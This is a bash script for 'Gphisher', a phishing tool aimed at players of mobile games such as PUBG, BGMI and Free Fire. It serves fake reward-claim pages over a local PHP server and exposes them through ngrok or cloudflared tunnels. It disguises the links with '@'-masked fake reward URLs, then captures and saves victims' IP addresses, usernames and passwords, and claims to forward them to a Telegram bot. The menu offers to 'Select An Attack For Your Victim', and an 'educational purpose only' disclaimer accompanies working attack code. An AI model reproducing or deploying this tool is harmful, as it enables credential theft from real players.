#!/bin/bash

##   Gphisher 	: 	Powerfull Gaming Phishing Tool
##   Author 	: 	ADITYA SINGH 
##   Coded By   :   TAHMID RAYAT
##   Version 	: 	1.0
##   Github 	: 	https://github.com/fireprojects

##   THANKS TO :
##   tahmid rayat - https://github.com/htr-tech
##   Aditya Shakya - https://github.com/adi1090x
##   1RaY-1 - https://github.com/1RaY-1
##   Moises Tapia - https://github.com/MoisesTapia
##   TheLinuxChoice - https://twitter.com/linux_choice
##   DarksecDevelopers  - https://github.com/DarksecDevelopers
##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
##   Võ Ngọc Bảo - https://github.com/vongocbao
##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009


## If you Copy Then Give the credits :)


##    GNU GENERAL PUBLIC LICENSE
##    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##    Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##    Copyright (C) 2022  FireProjects (https://github.com/fireprojects)


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

## Exit message
msg_exit() {
	{ clear; cat logo2.txt | lolcat; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using beta Version. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; cat logo2.txt | lolcat; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}ADITYA SINGH${RED}[ ${ORANGE}FIREPROJECTS${RED}]
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/Firerepo
		${GREEN}Social   ${RED}:  ${CYAN}https://t.me/FireRepo
		${GREEN}Source   ${RED}:  ${CYAN}https://github.com/htr-tech/zphisher
		${GREEN}Version  ${RED}:  ${ORANGE}1.0
		${REDBG}${WHITE} Thanks : Tahmid Rayat,Adi1090x,MoisesTapia,ThelinuxChoice
								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1 ${CYANBG}
		${RED}Warning:${WHITE}
		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		9 | 99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Login : ${BLUE}$LOGIN"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Email : ${BLUE}$EMAIL"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Full Information Sent To ${BLUE}Telegram,${ORANGE} In Your BOT. "
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; cat logo.txt | lolcat; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}

## DON'T COPY PASTE WITHOUT CREDIT DUDE :')

## Start Cloudflared
start_cloudflared() { 
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; cat logo.txt | lolcat; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; cat logo.txt | lolcat; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; cat logo.txt | lolcat; }
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Buggy${RED}]
		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Recommanded${RED}]
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_ngrok;;
		3 | 03)
			start_cloudflared;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## PUBG
site_pubg() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} [Simple ] Jujutsu Kaisen Event Fake Reward Claim Page {Done}
		${RED}[${WHITE}02${RED}]${ORANGE} [Real id] Month 8 Fake Reward Claim Page {Not Done}
		${RED}[${WHITE}03${RED}]${ORANGE} [Real id] Avalanche X-Suit Fake Reward Claim Page {Not Done}
		${RED}[${WHITE}04${RED}]${ORANGE} [Real id] Midasbuy Free Fake Login Page {Not Done}
		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="jujutsup"
			mask='http://pubg-x-jujutsu-kaisen-limited-rewards'
			tunnel_menu;;
		3 | 02)
			website="m7claimp"
			mask='http://pubg-free-month7-limited-rewards'
			tunnel_menu;;
		3 | 03)
			website="xsuitclaimb"
			mask='http://pubg-free-xsuit-limited-rewards'
			tunnel_menu;;
		4 | 04)
			website="midas"
			mask='http://midasbuy-limited-offer'
			tunnel_menu;;
		0 | 00 )
			main_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; cat logo.txt | lolcat; site_pubg; };;
	esac
}

## BGMI
site_bgmi() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} [Simple] Jujutsu Kaisen Event Fake Claim Page {Done}
		${RED}[${WHITE}02${RED}]${ORANGE} [Simple] Month 7 Fake Reward Claim Page {Not Done}
		${RED}[${WHITE}03${RED}]${ORANGE} [Simple] Avalanche X-Suit Fake Reward Spin Page {Not Done}
		${RED}[${WHITE}04${RED}]${ORANGE} [Simple] Avalanche X-Suit Fake Reward Claim Page {Not Done}
		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="jujutsub"
			mask='http://bgmi-x-jujutsu-kaisen-limited-rewards'
			tunnel_menu;;
		2 | 02)
			website="m7claimp"
    	mask='http://bgmi-month7-limited-rewards'
			tunnel_menu;;
		3 | 02)
			website="m7claimb"
			mask='http://bgmi-month7-limited-rewards'
			tunnel_menu;;
		3 | 03)
			website="xsuitspinb"
			mask='http://bgmi-avalanche-xsuit-limited-spin'
			tunnel_menu;;
		4 | 04)
			website="xsuitclaimb"
			mask='http://bgmi-avalanche-xsuit-limited-rewards'
			tunnel_menu;;
		0 | 00 )
			main_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; cat logo.txt | lolcat; site_bgmi; };;
	esac
}

## FREE_FIRE
site_ff() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Free Fire Free Characters  Page {Not Done}
		${RED}[${WHITE}02${RED}]${ORANGE} Free Fire Free Rewards Spin Page {Not Done}
		${RED}[${WHITE}03${RED}]${ORANGE} Free Fire Free Rewards Claim Page {Not Done}
		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="ffcharacter"
			mask='http://free-fire-free-character-limite-time'
			tunnel_menu;;		
		2 | 02)
			website="ffspin"
			mask='http://free-fire-get-free-rewards-spin'
			tunnel_menu;;
		3 | 03)
			website="ffclaim"
			mask='http://free-fire-get-free-rewards'
			tunnel_menu;;
		0 | 00 )
			main_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; cat logo.txt | lolcat; site_ff; };;
	esac
}

## FREE_FIRE_MAX
site_ffmax() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} [Simple ] Free Fire Max All Rewards Claim Page {Not Done}
		${RED}[${WHITE}02${RED}]${ORANGE} [Real id] Free Fire Max All Rewards Claim Page {INDONASIA} {Not Done}
		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="ffmax"
			mask='http://free-fire-max-super-rewards'
			tunnel_menu;;		
		2 | 02)
			website="ffmaxid"
			mask='http://free-fire-max-super-rewards'
			tunnel_menu;;
		0 | 00 )
			main_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; cat logo.txt | lolcat; site_ff; };;
	esac
}

## Menu
main_menu() {
	{ clear; cat logo2.txt | lolcat; echo; }
	cat <<- EOF
		${RED}[${WHITE}##${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
		${RED}[${WHITE}01${RED}]${ORANGE} Player Unknowns Battle Grounds Mobile (PUBGm) 
		${RED}[${WHITE}02${RED}]${ORANGE} Battle Ground Mobile India (BGMIm) 
		${RED}[${WHITE}03${RED}]${ORANGE} Garena Free Fire {Not Done}
		${RED}[${WHITE}04${RED}]${ORANGE} Garena Free Fire Max {Not Done}
		${RED}[${WHITE}05${RED}]${ORANGE} Call Of Duty Mobiles {Not Done}
		${RED}[${WHITE}06${RED}]${ORANGE} Mobile Legends: Bang Bang {Not Done}
		${RED}[${WHITE}99${RED}]${ORANGE} About
		${RED}[${WHITE}00${RED}]${ORANGE} Exit
	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_pubg;;
		2 | 02)
			site_bgmi;;
		3 | 03)
			site_ff;;
		4 | 04)
			site_ffmax;;
		5 | 05)
			website="codm"
			mask='http://callofduty-free-rewards-limited'
			tunnel_menu;;
		6 | 06)
			website="mblegend"
			mask='http://mobile-legends-bang-bang-free-latest-rewards'
			tunnel_menu;;
		9 | 99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
main_menu
